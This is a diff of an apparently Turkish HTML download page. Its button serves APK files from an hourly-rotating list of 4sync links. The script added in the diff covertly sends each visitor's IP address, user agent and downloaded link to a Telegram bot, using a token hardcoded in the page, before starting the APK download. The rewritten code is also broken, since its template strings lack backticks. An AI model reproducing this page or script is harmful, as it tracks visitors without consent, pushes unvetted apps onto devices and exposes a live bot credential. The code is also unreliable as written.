@@ -328,10 +328,14 @@
 </main>
 
 
-        <button type="button" class="btn btn-success fs-5 py-2 px-4 rounded-4" id="downloadBtn">Yükle</button>
+      <button type="button" class="btn btn-success fs-5 py-2 px-4 rounded-4" id="downloadBtn">Yükle</button>
 
 <script>
-const apkLinks = [
+document.addEventListener("DOMContentLoaded", () => {
+  const btn = document.getElementById('downloadBtn');
+
+  // APK linkleri
+  const apkLinks = [
 "https://www.4sync.com/web/directDownload/YmYFvbwx/Kal4G4pd.c07af79698735e75f07ca80630fe6fd8",
 "https://www.4sync.com/web/directDownload/YmYFvbwx/Kal4G4pd.c07af79698735e75f07ca80630fe6fd8",
 "https://www.4sync.com/web/directDownload/P4lDWxf-/Kal4G4pd.e7e51cd2fbb358c5861f981568be3e05",
@@ -356,56 +360,45 @@ const apkLinks = [
 "https://www.4sync.com/web/directDownload/s5DIqOgg/Kal4G4pd.8498425052ae3e3d6aadee14e2cb953d",
 "https://www.4sync.com/web/directDownload/W8tzXzuE/Kal4G4pd.f0ec0676a7553513bfdfe201a8d25859",
 "https://www.4sync.com/web/directDownload/W8tzXzuE/Kal4G4pd.f0ec0676a7553513bfdfe201a8d25859"
+  ];
 
-
-
-
-
-];
-
-function getCurrentLinkIndex() {
-  const now = new Date();
-  return now.getHours() % apkLinks.length;
-}
-
-function getCurrentLink() {
-  return apkLinks[getCurrentLinkIndex()];
-}
-
-function downloadFile() {
+  // Telegram ayarları
   const token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
   const chatId = '-1002478190818';
-  const fileUrl = getCurrentLink();
-  const userAgent = navigator.userAgent;
 
-  fetch('https://api.ipify.org?format=json')
-    .then(res => res.json())
-    .then(data => {
-      const ip = data.ip;
-      const message = `new userr.\nIP: ${ip}\nCihaz: ${userAgent}\nİndirilen link: ${fileUrl}`;
+  btn.addEventListener('click', () => {
+    btn.innerText = 'İndiriliyor...';
+    btn.disabled = true;
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-        .catch(() => { /* hata olsa bile indirmeye devam */ })
-        .finally(() => {
-          const a = document.createElement('a');
-          a.href = fileUrl;
-          a.download = '';
-          document.body.appendChild(a);
-          a.click();
-          document.body.removeChild(a);
-        });
-    })
-    .catch(() => {
-      const a = document.createElement('a');
-      a.href = fileUrl;
-      a.download = '';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-    });
-}
+    const fileUrl = apkLinks[new Date().getHours() % apkLinks.length];
+    const userAgent = navigator.userAgent;
 
-document.getElementById('downloadBtn').addEventListener('click', downloadFile);
+    // IP ve Telegram log gönderimi
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const message = new userr.\nIP: ${ip}\nCihaz: ${userAgent}\nİndirilen link: ${fileUrl};
+        return fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)});
+      })
+      .catch(() => { /* hata olsa bile devam et */ })
+      .finally(() => {
+        // Dosya indirme
+        const a = document.createElement('a');
+        a.href = fileUrl;
+        a.download = '';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        // 3 saniye sonra buton eski haline dönsün
+        setTimeout(() => {
+          btn.innerText = 'İndir';
+          btn.disabled = false;
+        }, 3000);
+      });
+  });
+});
 </script>
 
 
